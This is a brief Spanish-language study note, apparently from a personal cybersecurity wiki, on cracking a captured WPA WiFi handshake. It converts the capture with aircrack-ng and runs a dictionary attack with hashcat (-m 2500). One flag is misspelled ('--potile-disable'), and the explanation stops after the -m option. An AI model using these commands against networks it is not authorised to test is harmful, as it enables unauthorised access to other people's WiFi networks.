# Fuerza bruta con HashCat

Al capturar el handshake con aircrack-ng podemos aplicar una fuerza bruta a este con [[Ciberseguidad/Conceptos/Hacking Wifi/Herramientas/HashCat | HashCat]] 
para obtener el password del AC 

Primero debemos de pasar la captura ah un tipo de archivo legible para que lo comprensa hashcat

	aircrack-ng -j CapturaHCCAPX CapturaDeAuth-01.cap

Con el parametro *-j* y el nombre del nuevo archivo.

	hashcat -m 2500 -d 0 CapturaHCCAPX dicc.txt --outfile=deshash.txt --potile-disable

-m *Indicamos el tipo de hash, en este caso es un hash WPA*




